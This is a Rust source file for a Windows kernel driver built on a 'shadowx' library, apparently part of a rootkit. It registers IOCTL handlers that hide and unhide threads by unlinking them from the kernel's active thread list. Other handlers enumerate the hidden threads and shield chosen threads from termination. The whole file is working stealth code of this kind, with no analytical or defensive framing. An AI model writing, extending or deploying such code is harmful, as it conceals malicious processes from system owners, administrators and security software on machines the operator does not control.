use {
    alloc::boxed::Box, 
    core::sync::atomic::{AtomicPtr, Ordering},
    wdk_sys::{IO_STACK_LOCATION, IRP, STATUS_SUCCESS},
    shadowx::{Thread, THREAD_INFO_HIDE, error::ShadowError},
};

use {
    crate::utils::{
        get_input_buffer, 
        get_output_buffer, 
        ioctls::IoctlManager
    },
    common::{
        enums::Options,
        structs::TargetThread,
        ioctls::{
            ENUMERATION_THREAD, 
            HIDE_UNHIDE_THREAD,
        }, 
    }, 
};

/// Registers the IOCTL handlers for thread-related operations.
///
/// This function inserts two IOCTL handlers into the provided `HashMap`, associating them with
/// their respective IOCTL codes. The two operations supported are:
///
/// # Arguments
/// 
/// * `ioctls` - A mutable reference to a `HashMap<u32, IoctlHandler>` where the thread-related
///   IOCTL handlers will be inserted.
pub fn register_thread_ioctls(ioctls: &mut IoctlManager) {
    // Hide the specified Thread by removing it from the list of active threads.
    ioctls.register_handler(HIDE_UNHIDE_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        unsafe {
            // Retrieves the thread information from the input buffer.
            let target_thread = get_input_buffer::<TargetThread>(stack)?;
            let tid = (*target_thread).tid;

            // Hide or unhide the thread based on the 'enable' flag.
            let status = if (*target_thread).enable {
                // Hides the thread and stores its previous state.
                let previous_list = Thread::hide_thread(tid)?;
                let mut process_info = THREAD_INFO_HIDE.lock();
                let list_ptr = Box::into_raw(Box::new(previous_list));
        
                process_info.push(TargetThread  {
                    tid,
                    list_entry: AtomicPtr::new(list_ptr as *mut _),
                    ..Default::default()
                });
        
                STATUS_SUCCESS
            } else {
                // Unhides the thread.
                let list_entry = THREAD_INFO_HIDE.lock()
                    .iter()
                    .find(|p| p.tid == tid)
                    .map(|thread| thread.list_entry.load(Ordering::SeqCst))
                    .ok_or(ShadowError::ThreadNotFound(tid))?;

                Thread::unhide_thread(tid, list_entry as *mut _)?
            };
            
            // Updates the IoStatus and returns the result of the operation.
            (*irp).IoStatus.Information = size_of::<TargetThread>() as u64;
            Ok(status)
        }
    }));

    // List hidden or protected threads.
    ioctls.register_handler(ENUMERATION_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
        unsafe {
            // Retrieves the output buffer to store thread information.
            let output_buffer = get_output_buffer::<TargetThread>(irp)?;
            let input_target = get_input_buffer::<TargetThread>(stack)?;

            // Based on the options, either enumerate hidden or protected threads.
            let threads = match (*input_target).options {
                Options::Hide => Thread::enumerate_hide_threads(),
                #[cfg(not(feature = "mapper"))]
                Options::Protection => shadowx::ThreadCallback::enumerate_protection_thread(),
                #[cfg(feature = "mapper")]
                _ => alloc::vec::Vec::new(),
            };

            // Fill the output buffer with the enumerated threads' information.
            for (index, thread) in threads.iter().enumerate() {
                let info_ptr = output_buffer.add(index);
                (*info_ptr).tid = thread.tid;
            }

            // Updates the IoStatus with the size of the enumerated threads.
            (*irp).IoStatus.Information = (threads.len() * size_of::<TargetThread>()) as u64;
            Ok(STATUS_SUCCESS)
        }
    }));

    // If the feature is a mapper, these functionalities will not be added.
    #[cfg(not(feature = "mapper"))] {
        // Responsible for adding thread termination protection.
        ioctls.register_handler(common::ioctls::PROTECTION_THREAD, Box::new(|irp: *mut IRP, stack: *mut IO_STACK_LOCATION | {
            unsafe {
                // Retrieves the thread information from the input buffer.
                let thread_protection = get_input_buffer::<TargetThread>(stack)?;
                let tid = (*thread_protection).tid;
                let enable = (*thread_protection).enable;

                // Adds or removes protection for the thread based on the 'enable' flag.
                let status = if enable {
                    shadowx::ThreadCallback::add_target_tid(tid)
                } else {
                    shadowx::ThreadCallback::remove_target_tid(tid)
                };

                // Updates the IoStatus with the size of the thread information.
                (*irp).IoStatus.Information = size_of::<TargetThread>() as u64;
                Ok(status)
            }
        }));
    }
}
